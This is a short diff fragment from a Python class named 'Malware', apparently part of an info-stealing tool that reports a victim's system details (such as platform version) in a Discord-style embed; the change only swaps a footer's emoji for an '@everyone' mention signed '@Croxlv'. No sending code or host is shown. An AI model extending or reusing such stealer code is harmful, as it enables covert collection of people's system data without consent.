@@ -95,7 +95,7 @@ class Malware:
                     {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
                 ],
                 "footer": {
-                    "text": "<a:Rem:1511880153146462359> Im returning by death. | @Croxlv"
+                    "text": "@everyone Im returning by death. | @Croxlv"
                 }
             }
 
